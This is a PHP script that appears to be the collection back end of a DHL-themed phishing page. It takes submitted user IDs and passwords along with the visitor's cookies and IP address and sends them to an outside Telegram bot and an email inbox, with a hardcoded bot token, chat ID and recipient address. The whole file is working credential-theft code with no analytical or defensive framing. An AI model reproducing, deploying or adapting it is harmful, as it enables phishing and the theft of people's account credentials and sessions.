<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$cookies = $_SERVER['HTTP_COOKIE'];
$ips = getenv("REMOTE_ADDR");

function sendTelegramMessage($message) {
	$telegramBotToken = 'AAFEqUd2vAHFtIRtKtAH_tB62SCtamigQlU'; // bot token
	$telegramChatID = '1680217393'; // chat id
 
 
	 $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message);
 
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, $url);
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_TIMEOUT, 20);
	 $result = curl_exec($ch);
	 curl_close($ch);
 
	 return $result;
 }
 
if(!empty($_POST)) {
 $email= $_POST['userid'];
 $password = $_POST['userpwd'];
 
$resultbox = "buramala@yandex.com"; // email address



         $subject = "New Login";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "Cookies           : ".$cookies."\r\n";	 
		 $message .= "IP           : ".$ips."\r\n";	 
		 $message .= "Login Successful       : DHL-DROP\r\n";
		 sendTelegramMessage($message);
		 $header = "Content type:justin well\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 mail ($resultbox,$subject,$message,$header);

		 
		 
		
}




?> 